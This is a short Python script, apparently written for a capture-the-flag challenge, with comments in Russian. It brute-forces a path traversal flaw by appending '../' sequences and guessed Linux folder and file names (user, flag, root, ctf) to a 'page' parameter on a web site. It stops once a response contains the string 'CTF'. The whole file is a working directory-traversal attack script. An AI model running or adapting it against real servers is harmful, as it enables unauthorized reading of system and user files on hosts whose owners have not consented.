import requests
from requests.exceptions import HTTPError
count = 0
paths = ['home/', 'root/', 'home/ubuntu/', 'usr/']
folders = ['ubuntu/', 'desktop/', 'documents/', 'root/', 'daemon/', 'bin/', 'sys/', 'sync/', 'man/', 'lp/', 'mail/', 'news/', 'uucp/', 'proxy/', 'www-data/' 'systemd-network/', 'systemd-resolve/', 'syslog/', 'tss/', 'tcpdump/', 'sshd/', 'landscape/', 'ec2-instance-connect/', 'ubuntu/', 'lxd/', 'stupid_dev/']
oldPath = ['usr/sbin/', 'dev/', 'bin/', 'run/systemd/', 'home/syslog/', 'nonexistent/', 'var/lib/tpm/', 'nonexistent/', 'run/sshd/', 'var/lib/landscape/', '/']
files = ['user', 'flag', 'admin', 'root', 'ctf']
exet = ['.txt', '', '.html']
url = 'http://simple.com/?page=/../../../../../' # Для начала надо найти глубину выхода в корень сервера

# Два кривых генератора папок которые надо поправить, пока набор больше для ubuntu и работает не быстро
allOldPath = []
for path in oldPath:
    for folder in folders:
        for file in files:
            for exe in exet:
                allOldPath += [path + folder + file + exe]

allPath = []
for path in paths:
    for folder in folders:
        for file in files:
            for exe in exet:
                allPath += [path + folder + file + exe]

allPath += allOldPath
print(len(allPath))
for path in allPath:
    try:
        response = requests.get(url + path)

        # если ответ успешен, исключения задействованы не будут
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')  # Python 3.6
    except Exception as err:
        print(f'Other error occurred: {err}')  # Python 3.6
    else:
        count += 1
        if 'CTF' in response.content.decode('utf-8'):
            print('Well done', path, response.content.decode('utf-8'))
            break
        else:
            print('not found in', path, 'Proccess:', allPath.index(path) / len(allPath))
print(count)